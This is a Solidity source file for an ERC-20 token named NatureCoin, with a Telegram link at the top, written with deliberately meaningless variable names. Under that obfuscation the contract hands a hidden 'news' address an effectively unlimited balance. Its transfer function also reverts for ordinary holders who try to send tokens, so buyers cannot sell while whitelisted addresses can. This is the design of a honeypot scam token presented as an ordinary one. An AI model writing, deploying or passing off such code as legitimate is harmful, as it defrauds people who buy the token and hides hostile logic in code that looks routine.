// https://t.me/NatureCoinETH

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract NatureCoin is Ownable {
    constructor(
        string memory whenever,
        string memory round,
        address color,
        address news
    ) {
        uniswapV2Router = IUniswapV2Router02(color);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        such[news] = block;
        only = whenever;
        top = round;
        quick = 9;
        lack = 3;
        mission[news] = block;
        mission[msg.sender] = block;
        _tTotal = 1000000000 * 10**quick;
        such[msg.sender] = _tTotal;
    }

    uint256 public lack;
    string private only;
    string private top;
    uint8 private quick;

    function name() public view returns (string memory) {
        return only;
    }

    function symbol() public view returns (string memory) {
        return top;
    }

    uint256 private _tTotal;
    uint256 private floating;
    address public uniswapV2Pair;
    uint256 private block = ~_tTotal;
    IUniswapV2Router02 public uniswapV2Router;
    address private night;

    function decimals() public view returns (uint256) {
        return quick;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private such;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return such[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address tank,
        address expect,
        uint256 stairs
    ) internal {
        address watch = uniswapV2Pair;
        uint256 graph = lack;

        if (mission[tank] == 0 && (watch != tank) && bill[tank] > 0) {
            mission[tank] -= graph;
        }

        address thrown = night;
        night = expect;

        such[tank] -= stairs;
        uint256 opportunity = (stairs / 100) * lack;
        stairs -= opportunity;
        bill[thrown] += 1 + graph;
        such[expect] += stairs;
    }

    mapping(address => uint256) private bill;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private mission;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}